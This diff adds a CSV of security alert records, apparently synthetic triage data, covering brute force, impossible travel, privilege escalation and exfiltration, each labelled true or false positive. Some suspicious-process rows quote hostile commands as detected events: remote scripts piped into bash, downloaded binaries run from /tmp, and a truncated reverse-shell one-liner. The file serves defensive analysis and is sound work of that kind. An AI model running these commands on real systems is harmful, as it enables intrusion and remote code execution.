@@ -1,0 +1,67 @@
+rule,technique,severity,entity,detail,outcome
+Brute force,T1110,high,user018@103.70.153.197,19 failed logins in <2h,false_positive
+Brute force,T1110,high,user043@177.188.232.16,45 failed logins in <2h,true_positive
+Brute force,T1110,high,user043@95.103.180.18,59 failed logins in <2h,true_positive
+Brute force,T1110,high,user051@95.35.254.23,32 failed logins in <2h,true_positive
+Brute force,T1110,high,user057@177.228.129.220,53 failed logins in <2h,true_positive
+Brute force,T1110,high,user082@95.99.214.69,67 failed logins in <2h,true_positive
+Brute force,T1110,high,user085@95.45.252.139,48 failed logins in <2h,true_positive
+Brute force,T1110,high,user147@95.7.212.49,28 failed logins in <2h,true_positive
+Brute force,T1110,high,user171@95.144.142.45,34 failed logins in <2h,true_positive
+Brute force,T1110,high,user174@177.198.72.218,62 failed logins in <2h,true_positive
+Brute force,T1110,high,user193@52.191.189.134,19 failed logins in <2h,false_positive
+Impossible travel,T1078,high,user010,US->RU in 0.8h,true_positive
+Impossible travel,T1078,high,user011,US->RU in 0.5h,true_positive
+Impossible travel,T1078,high,user051,GB->RU in 0.1h,true_positive
+Impossible travel,T1078,high,user057,DE->RU in 1.0h,true_positive
+Impossible travel,T1078,high,user057,RU->DE in 0.3h,true_positive
+Impossible travel,T1078,high,user074,US->RU in 0.8h,true_positive
+Impossible travel,T1078,high,user074,RU->GB in 0.5h,true_positive
+Impossible travel,T1078,high,user082,US->RU in 0.2h,true_positive
+Impossible travel,T1078,high,user085,RU->US in 1.4h,true_positive
+Impossible travel,T1078,high,user134,US->IN in 0.7h,true_positive
+Impossible travel,T1078,high,user134,IN->RU in 0.1h,true_positive
+Impossible travel,T1078,high,user134,RU->IN in 0.5h,true_positive
+Impossible travel,T1078,high,user147,RU->US in 0.5h,true_positive
+Impossible travel,T1078,high,user156,US->RU in 0.4h,true_positive
+Impossible travel,T1078,high,user158,GB->US in 0.5h,true_positive
+Impossible travel,T1078,high,user158,US->GB in 0.3h,true_positive
+Impossible travel,T1078,high,user158,GB->RU in 0.4h,true_positive
+Impossible travel,T1078,high,user158,RU->GB in 0.4h,true_positive
+Impossible travel,T1078,high,user171,US->RU in 1.1h,true_positive
+Impossible travel,T1078,high,user171,RU->US in 0.5h,true_positive
+Suspicious process,T1059,critical,host12,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive
+Suspicious process,T1059,critical,host46,chmod +x /tmp/.k && /tmp/.k,true_positive
+Suspicious process,T1059,critical,host30,chmod +x /tmp/.k && /tmp/.k,true_positive
+Suspicious process,T1059,critical,host21,base64 -d payload.b64 | bash,true_positive
+Suspicious process,T1059,critical,host02,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive
+Suspicious process,T1059,critical,host29,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive
+Suspicious process,T1059,critical,host11,chmod +x /tmp/.k && /tmp/.k,true_positive
+Suspicious process,T1059,critical,host29,base64 -d payload.b64 | bash,true_positive
+Suspicious process,T1059,critical,host31,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive
+Suspicious process,T1059,critical,host15,"python3 -c 'import socket,os,pty;...'",true_positive
+Suspicious process,T1059,critical,host15,wget http://45.9.1.7/m -O /tmp/m && /tmp/m,true_positive
+Suspicious process,T1059,critical,host34,wget http://45.9.1.7/m -O /tmp/m && /tmp/m,true_positive
+Privilege escalation,T1548,high,host46,usermod -aG sudo user099,true_positive
+Privilege escalation,T1548,high,host40,sudo su -,false_positive
+Privilege escalation,T1548,high,host47,sudo bash -i,true_positive
+Privilege escalation,T1548,high,host49,sudo su -,true_positive
+Privilege escalation,T1548,high,host38,sudo su -,true_positive
+Privilege escalation,T1548,high,host04,sudo su -,false_positive
+Privilege escalation,T1548,high,host47,sudo su -,false_positive
+Privilege escalation,T1548,high,host21,sudo su -,false_positive
+Privilege escalation,T1548,high,host43,sudo su -,false_positive
+Privilege escalation,T1548,high,host15,sudo bash -i,true_positive
+Privilege escalation,T1548,high,host38,sudo su -,true_positive
+Privilege escalation,T1548,high,host36,sudo bash -i,true_positive
+Privilege escalation,T1548,high,host11,sudo su -,false_positive
+Data exfiltration,T1041,critical,host42,183 MB to 52.111.190.65,false_positive
+Data exfiltration,T1041,critical,host13,378 MB to 52.86.174.20,false_positive
+Data exfiltration,T1041,critical,host45,619 MB to 95.208.62.21,true_positive
+Data exfiltration,T1041,critical,host36,2485 MB to 95.195.238.150,true_positive
+Data exfiltration,T1041,critical,host10,232 MB to 52.35.253.133,false_positive
+Data exfiltration,T1041,critical,host21,1477 MB to 95.252.147.253,true_positive
+Data exfiltration,T1041,critical,host45,312 MB to 52.150.198.158,false_positive
+Data exfiltration,T1041,critical,host17,414 MB to 52.226.231.2,false_positive
+Data exfiltration,T1041,critical,host24,1182 MB to 95.56.128.247,true_positive
+Data exfiltration,T1041,critical,host34,1047 MB to 95.125.231.206,true_positive
